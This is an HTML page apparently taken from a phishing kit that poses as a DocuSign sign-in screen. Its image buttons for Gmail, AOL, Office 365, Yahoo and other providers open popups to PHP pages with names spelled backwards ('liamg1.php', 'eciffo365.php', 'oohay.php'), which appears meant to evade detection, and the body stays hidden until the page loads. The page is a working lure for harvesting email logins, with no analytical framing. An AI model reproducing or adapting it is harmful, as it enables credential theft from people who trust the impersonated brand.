<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In - DocuSign</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="shortcut icon"
              href="images/fav.png"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:627px; width:1342px; height:145px; z-index:0"><img src="images/bg_2.png" alt="" title="" border=0 width=1342 height=145></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1343px; height:635px; z-index:1"><img src="images/bgt_1.png" alt="" title="" border=0 width=1343 height=635></div>

<div id="image3" style="position:absolute; overflow:hidden; left:348px; top:273px; width:286px; height:83px; z-index:2"><a href="javascript:popupwnd('liamg1.php','no','no','no','no','no','no','901','101','401','501')"><img src="images/log_1.png" alt="" title="" border=0 width=286 height=83></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:702px; top:317px; width:168px; height:22px; z-index:3"><img src="images/al.png" alt="" title="" border=0 width=168 height=22></div>

<div id="image5" style="position:absolute; overflow:hidden; left:652px; top:344px; width:266px; height:37px; z-index:4"><img src="images/ght_1.png" alt="" title="" border=0 width=266 height=37></div>

<div id="image6" style="position:absolute; overflow:hidden; left:8px; top:735px; width:452px; height:25px; z-index:5"><a href="#"><img src="images/link.png" alt="" title="" border=0 width=452 height=25></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:356px; top:565px; width:76px; height:107px; z-index:6"><a href="javascript:popupwnd('liamg1.php','no','no','no','no','no','no','901','101','401','501')" target="_self"><img src="images/gml_1.png" alt="" title="" border=0 width=76 height=107></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:488px; top:565px; width:76px; height:103px; z-index:7"><a href="javascript:popupwnd('loa.php','no','no','no','no','no','no','901','101','401','401')" target="_self"><img src="images/aol_1.png" alt="" title="" border=0 width=76 height=103></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:620px; top:564px; width:78px; height:101px; z-index:8"><a href="javascript:popupwnd('eciffo365.php','no','no','no','no','no','no','901','101','401','401')" target="_self"><img src="images/out_1.png" alt="" title="" border=0 width=79 height=104></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:747px; top:564px; width:78px; height:105px; z-index:9"><a href="javascript:popupwnd('oohay.php','no','no','no','no','no','no','901','101','401','401')" target="_self"><img src="images/yhoo_1.png" alt="" title="" border=0 width=78 height=105></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:881px; top:565px; width:76px; height:105px; z-index:10"><a href="javascript:popupwnd('rehto.php','no','no','no','no','no','no','901','101','401','401')" target="_self"><img src="images/othr_1.png" alt="" title="" border=0 width=76 height=105></a></div>


</body>
</html>
